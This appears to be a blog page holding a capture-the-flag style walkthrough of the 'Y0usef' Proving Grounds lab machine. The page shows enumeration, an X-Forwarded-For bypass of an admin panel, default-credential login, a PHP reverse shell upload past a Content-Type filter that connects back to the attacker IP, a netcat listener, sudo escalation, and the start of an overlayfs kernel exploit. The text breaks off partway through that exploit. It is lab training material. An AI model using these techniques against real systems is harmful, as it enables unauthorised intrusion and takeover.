@@ -1,0 +1,1281 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Enumeration,User Credentials,Kernel Exploit," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="In this walkthrough, we will exploit the target via bypassing misconfigured application access safeguards. We’ll then exploit a file upload vulnerability while bypassing a basic file content type filt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Y0usef">
+<meta property="og:url" content="https://sev1on.github.io/undefined/Y0usef/index.html">
+<meta property="og:site_name" content="Sev1on">
+<meta property="og:description" content="In this walkthrough, we will exploit the target via bypassing misconfigured application access safeguards. We’ll then exploit a file upload vulnerability while bypassing a basic file content type filt">
+<meta property="og:locale">
+<meta property="og:image" content="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_68_image_1_8e2eCVUo.png">
+<meta property="og:image" content="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_68_image_2_ps77A92W.png">
+<meta property="article:published_time" content="2021-05-28T23:01:23.000Z">
+<meta property="article:modified_time" content="2021-08-01T10:29:03.607Z">
+<meta property="article:author" content=" ">
+<meta property="article:tag" content="Enumeration">
+<meta property="article:tag" content="User Credentials">
+<meta property="article:tag" content="Kernel Exploit">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_68_image_1_8e2eCVUo.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Sev1on'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://sev1on.github.io/undefined/Y0usef/"/>
+
+
+
+
+
+  <title>Y0usef | Sev1on</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sev1on</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-fas fa-tag"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-fa-solid fa-align-center"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-far fa-user-circle"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://sev1on.github.io/undefined/Y0usef/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/Sevion3.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sev1on">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Y0usef</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-05-28T23:01:23+00:00">
+                2021-05-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux-Walkthrough/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux Walkthrough</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  In this walkthrough, we will exploit the target via bypassing misconfigured application access safeguards. We’ll then exploit a file upload vulnerability while bypassing a basic file content type filtering by the application. We’ll be able to escalate our privileges on the target by either recovering a user’s credentials, who has unlimited sudo rights, or exploiting the operating system’s very old kernel version via the *overlayfs* local privilege escalation exploit.
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Y0usef"><a href="#Y0usef" class="headerlink" title="Y0usef"></a>Y0usef</h1><h1 id="Exploitation-Guide-for-Y0usef"><a href="#Exploitation-Guide-for-Y0usef" class="headerlink" title="Exploitation Guide for Y0usef"></a><strong>Exploitation Guide for Y0usef</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><p>In this walkthrough, we will exploit the target via bypassing misconfigured application access safeguards. We’ll then exploit a file upload vulnerability while bypassing a basic file content type filtering by the application. We’ll be able to escalate our privileges on the target by either recovering a user’s credentials, who has unlimited sudo rights, or exploiting the operating system’s very old kernel version via the <em>overlayfs</em> local privilege escalation exploit.</p>
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We’ll begin with an <code>nmap</code> scan.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap 192.168.120.65</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 09:17 EDT</span><br><span class="line">Nmap scan report for 192.168.120.65</span><br><span class="line">Host is up (0.030s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="GoBuster"><a href="#GoBuster" class="headerlink" title="GoBuster"></a><strong>GoBuster</strong></h3><p>Navigating to the website on port 80 does not give us anything useful. The site appears to be under construction.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl http://192.168.120.65</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2&quot; crossorigin=&quot;anonymous&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container-fluid&quot;&gt;</span><br><span class="line">&lt;center class=&quot;mt-5&quot;&gt;</span><br><span class="line">&lt;h1&gt;Sorry , the site is under construction soon, it run &lt;/h1&gt;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Next, let’s try employing <code>gobuster</code> to brute-force the site’s directories. We’ll start with a smaller wordlist <strong>/usr/share/wordlists/dirb/small.txt</strong>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ gobuster dir -u http://192.168.120.65/ -w /usr/share/wordlists/dirb/small.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.120.65/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/small.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/02 09:04:05 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/administration       (Status: 301) [Size: 325] [--&gt; http://192.168.120.65/administration/]</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">2021/04/02 09:04:08 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Our scan gets a 301 response in the directory <strong>/administration</strong>.</p>
+<h3 id="HTTP-Enumeration"><a href="#HTTP-Enumeration" class="headerlink" title="HTTP Enumeration"></a><strong>HTTP Enumeration</strong></h3><p>Navigating to the discovered directory (<a target="_blank" rel="noopener" href="http://192.168.120.65/administration/">http://192.168.120.65/administration/</a>), we are met with a 403-Forbidden error code.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl http://192.168.120.65/administration/</span><br><span class="line">&lt;h1&gt;Forbidden&lt;/h1&gt;&lt;p&gt;You don&#x27;t have permission to access on this folder&lt;/p&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Unfortunately, the server shows no indication why exactly it gave us the 403 error code.</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Host-Header-Injection-Vulnerability"><a href="#Host-Header-Injection-Vulnerability" class="headerlink" title="Host Header Injection Vulnerability"></a><strong>Host Header Injection Vulnerability</strong></h3><p>To investigate this further, we’ll set up our browser to use Burp proxy and intercept this request.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /administration/ HTTP/1.1</span><br><span class="line">Host: 192.168.120.65</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>As expected, we get the 403 code back from the server.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 403 Forbidden</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Because this is probably an administrative interface (judging by the name of it), we can deduce that it might not like where our request is coming from (i.e. our IP address). Many admin panels and interfaces only grant access to the traffic from localhost. Let’s send our request to the <em>Repeater</em> and see if we can find a way to bypass this obstacle.</p>
+<p>If a server is vulnerable to such trickery, a common way to bypass this restriction is to add the <code>X-Forwarded-For</code> HTTP header and set it to the localhost address:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Let’s try this. Our complete request will look like this:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /administration/ HTTP/1.1</span><br><span class="line">Host: 192.168.120.65</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>After we send this request to the server, we get back a <code>200 OK</code> and are presented with a web page!</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OKDate: Fri, 02 Apr 2021 13:40:20 GMTServer: Apache/2.4.10 (Ubuntu)X-Powered-By: PHP/5.5.9-1ubuntu4.29Set-Cookie: PHPSESSID=oq4shm2bghmpf9mqvdrpafvns6; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheVary: Accept-EncodingContent-Length: 926Connection: closeContent-Type: text/html&lt;html&gt;&lt;head&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;body&gt;&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;...</span><br></pre></td></tr></table></figure>
+
+<p>Nice, we have made some progress. Let’s add this header to our proxy session permanently. To do that, we’ll navigate to <em>Proxy</em> -&gt; <em>Options</em>, then scroll down to <em>Match and Replace</em>, and add our new header there.</p>
+<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_68_image_1_8e2eCVUo.png" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_68_image_1_8e2eCVUo.png"></p>
+<p>Now if we refresh our browser at <a target="_blank" rel="noopener" href="http://192.168.120.65/administration/">http://192.168.120.65/administration/</a>, we are presented with a login control.</p>
+<h3 id="Application-Credential-Guessing"><a href="#Application-Credential-Guessing" class="headerlink" title="Application Credential Guessing"></a><strong>Application Credential Guessing</strong></h3><p>Before we start brute-forcing the login control, let’s try guessing some default credentials. One of the first ones we’ll try is <code>admin:admin</code>, and it works! We are now successfully authenticated and redirected to <a target="_blank" rel="noopener" href="http://192.168.120.65/administration/dashborad/">http://192.168.120.65/administration/dashborad/</a>.</p>
+<h3 id="File-Upload-Vulnerability"><a href="#File-Upload-Vulnerability" class="headerlink" title="File Upload Vulnerability"></a><strong>File Upload Vulnerability</strong></h3><p>In the left-side navigation menu, we see a link to <em>Upload file</em>. File upload functionality is always interesting to explore as it can oftentimes contain vulnerabilities. Navigating there (<a target="_blank" rel="noopener" href="http://192.168.120.65/administration/upload/">http://192.168.120.65/administration/upload/</a>), we are indeed presented with a file upload control.</p>
+<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_68_image_2_ps77A92W.png" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_68_image_2_ps77A92W.png"></p>
+<p>Let’s try uploading a PHP reverse shell. We’ll copy it to our directory and replace the IP address and port number on lines 49 and 50 as needed.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]└─$ cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ip = &#x27;192.168.118.5&#x27;;  // CHANGE THIS$port = 4444;       // CHANGE THIS</span><br></pre></td></tr></table></figure>
+
+<p>However, clicking the <em>Send</em> button displays the following error at the very top of the web page:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file not allow</span><br></pre></td></tr></table></figure>
+
+<p>Looks like PHP files are blacklisted. Let’s see if the application is only checking file type during the upload and not file content itself. To do that, we’ll set our Burp proxy to intercept the request before uploading the shell file again. Once the intercept is enabled, we’ll select our shell and click <em>Send</em>. While the page is hanging, we’ll inspect the intercepted request.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /administration/upload/ HTTP/1.1Host: 192.168.120.65User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------130540507737268991721537520459Content-Length: 5839Origin: http://192.168.120.65Connection: closeReferer: http://192.168.120.65/administration/upload/Cookie: PHPSESSID=nsh0gp8fi31pf9rkhf1rg4sn91Upgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1-----------------------------130540507737268991721537520459Content-Disposition: form-data; name=&quot;document&quot;; filename=&quot;shell.php&quot;Content-Type: application/x-php&lt;?php// php-reverse-shell - A Reverse Shell implementation in PHP// Copyright (C) 2007 pentestmonkey@pentestmonkey.net...</span><br></pre></td></tr></table></figure>
+
+<p>To test our theory, we’ll modify the <code>Content-Type</code> parameter to <code>image/png</code>. The modified request would look like this:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...Upgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1-----------------------------130540507737268991721537520459Content-Disposition: form-data; name=&quot;document&quot;; filename=&quot;shell.php&quot;Content-Type: image/png...</span><br></pre></td></tr></table></figure>
+
+<p>We’ll now forward this request to the server. Now at the top of the page, we see the following:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file uploadad files/1617375016shell.php</span><br></pre></td></tr></table></figure>
+
+<p>Nice, it looks like our shell has been successfully uploaded, and the server responded with its location. Let’s start a Netcat listener on port 4444. Once our listener is running, we’ll trigger the reverse shell by navigating to the URL provided by the server, appending it to the current <strong>/upload/</strong> directory.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]└─$ curl http://192.168.120.65/administration/upload/files/1617375016shell.php...</span><br></pre></td></tr></table></figure>
+
+<p>Our listener reports that we have received a reverse shell connection as the <code>www-data</code> user.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]└─$ nc -lvp 4444listening on [any] 4444 ...192.168.120.65: inverse host lookup failed: Unknown hostconnect to [192.168.118.5] from (UNKNOWN) [192.168.120.65] 54728Linux yousef-VirtualBox 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:08:14 UTC 2014 i686 i686 i686 GNU/Linux 17:55:39 up  2:10,  0 users,  load average: 0.00, 0.01, 0.05USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#x27;t access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><p>There are a couple of different vectors we can use to escalate our privileges on the target. The first vector involves recovering user credentials, and the second one involves exploiting a kernel vulnerability.</p>
+<h3 id="Local-Enumeration"><a href="#Local-Enumeration" class="headerlink" title="Local Enumeration"></a><strong>Local Enumeration</strong></h3><p>Looking around the file system, we find an interesting file <strong>user.txt</strong> in the home directory.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /hometotal 8-rw-r--r--  1 root   root     53 Dec  8 02:14 user.txtdrwxr-xr-x 18 yousef yousef 4096 Apr  1 17:24 yousef</span><br></pre></td></tr></table></figure>
+
+<p>Looking inside the file, we find what looks to be a base64-encoded string.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /home/user.txtc3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=</span><br></pre></td></tr></table></figure>
+
+<p>Let’s try to decode this string.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /home/user.txt | base64 -dssh :user : yousefpass : yousef123</span><br></pre></td></tr></table></figure>
+
+<p>We find credentials for user <code>yousef</code>, with which we should be able to SSH to the target.</p>
+<p>Additionally, checking the kernel version reveals that this is a very old operating system.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ uname -r3.13.0-24-generic</span><br></pre></td></tr></table></figure>
+
+<h3 id="Escalation-via-User-Credentials"><a href="#Escalation-via-User-Credentials" class="headerlink" title="Escalation via User Credentials"></a><strong>Escalation via User Credentials</strong></h3><p>Using the discovered user credentials, we can SSH to the target.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]└─$ ssh yousef@192.168.120.65yousef@192.168.120.65&#x27;s password:Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic i686) * Documentation:  https://help.ubuntu.com/yousef@yousef-VirtualBox:~$ iduid=1000(yousef) gid=1000(yousef) groups=1000(yousef),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</span><br></pre></td></tr></table></figure>
+
+<p>Let’s check what this user is able to run with sudo.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yousef@yousef-VirtualBox:~$ sudo -l[sudo] password for yousef:Matching Defaults entries for yousef on yousef-VirtualBox:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser yousef may run the following commands on yousef-VirtualBox:    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>
+
+<p>We find that the user <code>yousef</code> has wide-open sudo permissions. We can easily take advantage of this and spawn a root shell.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yousef@yousef-VirtualBox:~$ whoamiyousefyousef@yousef-VirtualBox:~$ sudo suroot@yousef-VirtualBox:/home/yousef# whoamiroot</span><br></pre></td></tr></table></figure>
+
+<h3 id="Escalation-via-Kernel-Exploit"><a href="#Escalation-via-Kernel-Exploit" class="headerlink" title="Escalation via Kernel Exploit"></a><strong>Escalation via Kernel Exploit</strong></h3><p>Given the age of this operating system kernel version, there are several exploits available for it. We will opt for the <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/37292">overlayfs Local Privilege Escalation</a> exploit.</p>
+<p>Having downloaded the exploit source code to our attacking machine, we’ll start a python web server to host it.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]└─$ sudo python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br></pre></td></tr></table></figure>
+
+<p>On the target machine, we’ll navigate to the <strong>/tmp</strong> directory and download the exploit code.</p>
